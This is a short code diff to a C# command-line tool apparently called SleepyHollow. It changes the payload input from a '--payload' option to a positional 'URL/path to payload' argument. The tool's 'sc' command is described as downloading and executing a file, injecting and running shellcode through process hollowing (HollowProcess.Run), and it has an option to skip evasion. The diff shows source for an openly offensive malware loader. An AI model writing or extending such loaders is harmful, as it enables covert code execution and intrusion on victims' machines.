@@ -3,11 +3,10 @@ using SleepyHollow;
 #if !HEADLESS
 using System.CommandLine;
 
-var payloadOption = new Option<string>(
-    name: "--payload",
+var payloadArgument = new Argument<string>(
+    name: "URL/path to payload",
     description: "The file to download and execute"
 );
-payloadOption.AddAlias("-p");
 
 var methodOption = new Option<string>(name: "--method", description: "Execution method").FromAmong(
     "inject",
@@ -24,7 +23,7 @@ waitOptions.SetDefaultValue(0);
 
 var scCommand = new Command("sc", "Injects and runs shellcode")
 {
-    payloadOption,
+    payloadArgument,
     methodOption,
     waitOptions
 };
@@ -103,7 +102,7 @@ scCommand.SetHandler(
             await HollowProcess.Run(buf);
         await Task.Delay(wait * 1000);
     },
-    payloadOption,
+    payloadArgument,
     methodOption,
     skipEvasionOption,
     debugOption,
